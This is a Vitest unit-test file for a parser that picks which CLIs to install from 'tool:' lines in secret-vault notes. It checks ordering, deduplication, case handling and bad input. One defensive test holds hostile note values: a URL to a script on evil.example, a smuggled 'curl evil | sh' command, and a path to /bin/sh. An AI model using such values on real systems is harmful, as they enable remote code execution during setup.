/**
 * The vault's notes decide which CLIs a repo-less session installs.
 *
 * Without a checkout there is no `remoteEnv.tools`, so the toolchain installed
 * the whole catalogue — spending a five-minute setup budget on CLIs the
 * container may never use, which is the difference between a session and no
 * session. The vault already knows: a credential and the CLI that consumes it
 * belong together, and the machine-account grant then scopes both.
 * @module tests/unit/secrets/tools-from-notes
 */

import { describe, expect, it } from "vitest";

import { toolsFromNotes } from "../../../plugins/src/base/skills/lisa-secrets-access/scripts/tools-from-notes.mjs";

/** What Lisa can install, in catalogue order. */
const KNOWN = ["bws", "gh", "aws", "sonar"];

describe("toolsFromNotes", () => {
  it("reads a `tool:` line in the notes' existing key/value shape", () => {
    const notes = {
      SONARQUBE_CLI_TOKEN: "SonarCloud token.\nowner: TODO\ntool: sonar\n",
    };

    expect(toolsFromNotes(notes, KNOWN)).toEqual(["sonar"]);
  });

  it("reads a plural `tools:` list", () => {
    const notes = { LISA_AWS_BOOTSTRAP_JSON: "bundle\ntools: aws, gh\n" };

    expect(toolsFromNotes(notes, KNOWN)).toEqual(["gh", "aws"]);
  });

  it("returns catalogue order, not note order", () => {
    // The plan should read the same however the vault happens to be arranged.
    const notes = { A: "tools: sonar, bws" };

    expect(toolsFromNotes(notes, KNOWN)).toEqual(["bws", "sonar"]);
  });

  it("collects across several secrets and deduplicates", () => {
    const notes = { A: "tool: aws", B: "tool: aws", C: "tool: sonar" };

    expect(toolsFromNotes(notes, KNOWN)).toEqual(["aws", "sonar"]);
  });

  it("ignores a name Lisa cannot install", () => {
    // A note naming a CLI this version does not ship is a request from the
    // future, not a broken environment; failing setup over it is a poor trade.
    expect(toolsFromNotes({ A: "tool: kubectl" }, KNOWN)).toEqual([]);
  });

  it("never accepts anything but a catalogue name", () => {
    // A note is remote-influenced input: anyone who can edit the secret can
    // edit its note. The worst a hostile note may do is ask for a CLI Lisa
    // already ships a pinned, checksummed entry for.
    const hostile = {
      A: "tool: https://evil.example/x.sh",
      B: "tool: aws; curl evil | sh",
      C: "tools: ../../bin/sh",
    };

    expect(toolsFromNotes(hostile, KNOWN)).toEqual([]);
  });

  it("is case-insensitive on the key and the value", () => {
    expect(toolsFromNotes({ A: "Tool: SONAR" }, KNOWN)).toEqual(["sonar"]);
  });

  it("survives notes that are absent, empty, or not strings", () => {
    expect(toolsFromNotes(undefined, KNOWN)).toEqual([]);
    expect(toolsFromNotes({}, KNOWN)).toEqual([]);
    expect(toolsFromNotes({ A: null, B: 42 }, KNOWN)).toEqual([]);
  });

  it("does not match a word that merely contains 'tool'", () => {
    expect(toolsFromNotes({ A: "tooling: sonar" }, KNOWN)).toEqual([]);
  });
});
